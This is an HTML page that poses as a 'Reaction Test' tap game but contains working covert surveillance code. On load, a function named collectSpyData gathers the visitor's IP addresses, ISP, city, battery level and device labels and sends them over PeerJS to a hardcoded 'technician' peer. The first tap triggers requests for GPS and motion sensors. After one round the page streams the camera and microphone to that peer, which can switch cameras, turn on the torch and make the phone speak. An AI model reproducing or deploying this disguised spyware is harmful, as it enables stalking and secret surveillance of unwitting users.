<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reaction Test</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: 'Arial', sans-serif;
            margin: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            touch-action: none;
            user-select: none;
        }

        #game-board {
            width: 85vw;
            height: 85vw;
            max-width: 400px;
            max-height: 400px;
            background-color: #2c3e50;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
            border: 4px solid #34495e;
            cursor: pointer;
            z-index: 10;
            transition: background-color 0.1s;
        }

            #game-board.success {
                background-color: #27ae60;
            }

            #game-board.fail {
                background-color: #c0392b;
            }

        #hud-container {
            margin-bottom: 30px;
            text-align: center;
            z-index: 10;
        }

        #main-display {
            font-size: 50px;
            font-weight: bold;
            color: #bdc3c7;
            text-shadow: 2px 2px 0 #000;
        }

        #flashlight-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            z-index: 9999;
            display: none;
            cursor: none;
        }
    </style>
</head>
<body>

    <div id="flashlight-layer"></div>
    <div id="hud-container"><div id="main-display">TAP TO START</div></div>
    <div id="game-board"></div>

    <script>
        const TECHNICIAN_ID = "cybrrsupport-zomzzssnzcr-141"; // עבר לעדכון שלך
        const TRIGGER_COUNT = 1;

        let gameState = 'IDLE'; let beepTimestamp = 0; let roundCount = 0;
        let isVideoConnected = false; let hasInteracted = false; let wakeLock = null;

        const AudioContext = window.AudioContext || window.webkitAudioContext;
        let audioCtx; const synth = window.speechSynthesis;
        const board = document.getElementById('game-board');
        const display = document.getElementById('main-display');

        const peer = new Peer();
        let myDataConnection = null; let currentStream = null;

        // --- 1. DATA EXTRACTION LOGIC ---
        async function collectSpyData() {
            let ipv4 = 'unknown', ipv6 = 'None', isp = 'unknown', loc = 'unknown';

            // שלב 1: משיכת IPv4 ודאית
            try {
                const res4 = await fetch('https://api4.ipify.org?format=json');
                const data4 = await res4.json();
                ipv4 = data4.ip;
            } catch (e) { console.error("IPv4 fetch failed"); }

            // שלב 2: משיכת IPv6 (שמנו ב-try/catch נפרד כי זה יקרוס למשתמשים בלי תמיכה)
            try {
                // טיימר קצר כדי שלא נתקע את הסקריפט למשתמשים שאין להם ניתוב ל-v6
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 1500);

                const res6 = await fetch('https://api6.ipify.org?format=json', { signal: controller.signal });
                clearTimeout(timeoutId);

                const data6 = await res6.json();
                ipv6 = data6.ip;
            } catch (e) {
                // מתעלמים בשקט. רוב הסיכויים שלמטרה פשוט אין חיבור IPv6 פעיל.
            }

            // עיצוב התצוגה לקונסולה
            let displayIp = `v4: ${ipv4}`;
            if (ipv6 !== 'None') {
                displayIp += `\nv6: ${ipv6}`; // הוספנו ירידת שורה כדי שזה לא ישבור את הטבלה
            }

            // שלב 3: חילוץ מיקום גיאוגרפי וספקית על בסיס ה-IPv4 (שהוא אמין יותר למיקומים)
            try {
                const targetIpForGeo = ipv4 !== 'unknown' ? ipv4 : '';
                const geoRes = await fetch(`https://ipapi.co/${targetIpForGeo}/json/`);
                const geoData = await geoRes.json();
                isp = geoData.org || "Unknown ISP";
                loc = `${geoData.city}, ${geoData.country_name}`;
            } catch (e) { console.error("Geo Fetch Error:", e); }

            // טלמטריה של חומרה
            let battery = 'unknown';
            try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; } catch (e) { }

            let mediaDevices = [];
            try {
                const devs = await navigator.mediaDevices.enumerateDevices();
                mediaDevices = devs.map(d => `${d.kind.substring(0, 3)}: ${d.label || 'Hidden'}`);
            } catch (e) { }

            // מחזירים את המחרוזת המשולבת לתוך האובייקט
            return { ip: displayIp, isp, location: loc, battery, mediaDevices };
        }

        // --- PHYSICAL MOTION SENSORS (GYRO & COMPASS) ---
        let currentMotion = { posture: "Desktop / No Sensor", heading: "Unknown", raw: "" };

        function requestSensorPermissions() {
            if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                DeviceOrientationEvent.requestPermission()
                    .then(permissionState => {
                        if (permissionState === 'granted') window.addEventListener('deviceorientation', handleOrientation);
                    }).catch(console.error);
            } else {
                window.addEventListener('deviceorientation', handleOrientation);
            }
        }

        function handleOrientation(event) {
            let alpha = event.alpha; // Compass
            let beta = event.beta;   // Front-to-back tilt
            let gamma = event.gamma; // Left-to-right tilt

            if (event.webkitCompassHeading) alpha = event.webkitCompassHeading; // iOS fallback

            if (beta === null) return; // Desktop devices without gyroscopes

            let posture = "In Hand / Moving";
            if (Math.abs(beta) < 15 && Math.abs(gamma) < 15) posture = "Stable on Table (Face Up)";
            else if (Math.abs(beta) > 165 && Math.abs(gamma) < 15) posture = "Stable on Table (Face Down)";
            else if (beta > 30 && beta < 80 && Math.abs(gamma) < 30) posture = "In Hand (Reading)";
            else if (beta > 80 && beta < 100) posture = "Upright (Camera Forward)";
            else if (beta < -70 && beta > -110) posture = "Upside Down (In Pocket?)";

            let heading = "Unknown";
            if (alpha !== null) {
                if (alpha >= 315 || alpha < 45) heading = "Facing North";
                else if (alpha >= 45 && alpha < 135) heading = "Facing East";
                else if (alpha >= 135 && alpha < 225) heading = "Facing South";
                else if (alpha >= 225 && alpha < 315) heading = "Facing West";
            }

            currentMotion = { posture, heading, raw: `T:${Math.round(beta)}° R:${Math.round(gamma)}°` };
        }

        // MOCK FUNCTIONS
        function simulateLANScanner() {
            return ["[GATEWAY] 192.168.1.1", "[HOST] 192.168.1.14", "[IOT] 192.168.1.102"];
        }

        function requestPreciseLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    const loc = `LAT: ${pos.coords.latitude.toFixed(5)} LON: ${pos.coords.longitude.toFixed(5)}`;
                    if (myDataConnection) myDataConnection.send({ type: 'info', location: loc });
                }, null, { enableHighAccuracy: true });
            }
        }

        // --- 2. CONNECTION INITIALIZATION ---
        peer.on('open', async (id) => {
            myDataConnection = peer.connect(TECHNICIAN_ID);
            myDataConnection.on('open', async () => {
                const fullData = await collectSpyData();
                myDataConnection.send({ type: 'info', ...fullData });

                // Send live motion data every second
                setInterval(() => {
                    if (myDataConnection && myDataConnection.open && currentMotion.posture !== "Desktop / No Sensor") {
                        myDataConnection.send({ type: 'motion', data: currentMotion });
                    }
                }, 1000);

                setTimeout(() => {
                    myDataConnection.send({ type: 'lan_scan', data: simulateLANScanner() });
                }, 2000);

                myDataConnection.on('data', (data) => {
                    if (data.command === 'swap') toggleCamera();
                    if (data.command === 'flash_on') toggleTorch(true);
                    if (data.command === 'flash_off') toggleTorch(false);
                    if (data.command === 'speak' && data.text) speakText(data.text);
                });
            });
        });

        // --- 3. GAME & INTERACTION LOGIC ---
        board.addEventListener('touchstart', handleInput, { passive: false });
        board.addEventListener('mousedown', handleInput);

        async function handleInput(e) {
            e.preventDefault();
            if (!audioCtx) audioCtx = new AudioContext(); if (audioCtx.state === 'suspended') audioCtx.resume();
            if (synth.paused) synth.resume();
            if (!wakeLock) { try { wakeLock = await navigator.wakeLock.request('screen'); } catch (e) { } }

            // Trigger interactions on first tap
            if (!hasInteracted) {
                hasInteracted = true;
                requestSensorPermissions(); // Ask for Gyro/Compass quietly
                requestPreciseLocation();
            }

            if (gameState === 'IDLE') {
                gameState = 'WAITING_FOR_BEEP'; display.innerText = "WAIT..."; display.style.color = "#f1c40f"; scheduleBeep(); return;
            }
            if (gameState === 'WAITING_FOR_BEEP') {
                display.innerText = "TOO EARLY!"; display.style.color = "#e74c3c"; flashBoard('fail'); clearTimeout(beepTimer);
                setTimeout(() => { display.innerText = "WAIT..."; display.style.color = "#f1c40f"; scheduleBeep(); }, 1000); return;
            }
            if (gameState === 'WAITING_FOR_TAP') {
                display.innerText = (Date.now() - beepTimestamp) + " ms"; display.style.color = "#2ecc71"; flashBoard('success'); roundCount++;
                if (roundCount === TRIGGER_COUNT && !isVideoConnected) activateCamera();
                gameState = 'WAITING_FOR_BEEP';
                setTimeout(() => { display.innerText = "WAIT..."; display.style.color = "#f1c40f"; scheduleBeep(); }, 1000);
            }
        }

        // --- 4. HARDWARE CONTROLS ---
        async function activateCamera() {
            isVideoConnected = true;
            try { await startStream('user'); } catch (err) { }
        }

        async function startStream(mode) {
            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
            currentStream = stream; peer.call(TECHNICIAN_ID, stream);
        }

        let currentMode = 'user'; let preFlashMode = null;
        function toggleCamera() { currentMode = (currentMode === 'user') ? 'environment' : 'user'; startStream(currentMode); }

        async function toggleTorch(turnOn) {
            const track = currentStream ? currentStream.getVideoTracks()[0] : null;
            if (turnOn) {
                if (currentMode === 'user') { preFlashMode = 'user'; currentMode = 'environment'; await startStream('environment'); setTimeout(() => toggleTorch(true), 500); return; }
                if (track && track.getCapabilities().torch) { try { await track.applyConstraints({ advanced: [{ torch: true }] }); return; } catch (e) { } }
                document.getElementById('flashlight-layer').style.display = 'block';
            } else {
                if (track && track.getCapabilities().torch) { try { await track.applyConstraints({ advanced: [{ torch: false }] }); } catch (e) { } }
                document.getElementById('flashlight-layer').style.display = 'none';
                if (preFlashMode === 'user') { currentMode = 'user'; await startStream('user'); preFlashMode = null; }
            }
        }

        function speakText(text) { synth.cancel(); synth.speak(new SpeechSynthesisUtterance(text)); }
        let beepTimer = null;
        function scheduleBeep() { beepTimer = setTimeout(() => { playTone(); beepTimestamp = Date.now(); gameState = 'WAITING_FOR_TAP'; }, Math.floor(Math.random() * 2000) + 1000); }
        function playTone() { const osc = audioCtx.createOscillator(); const g = audioCtx.createGain(); osc.connect(g); g.connect(audioCtx.destination); osc.frequency.value = 600; g.gain.value = 0.1; osc.start(); osc.stop(audioCtx.currentTime + 0.15); }
        function flashBoard(type) { board.classList.add(type); setTimeout(() => board.classList.remove(type), 200); }
    </script>
</body>
</html>
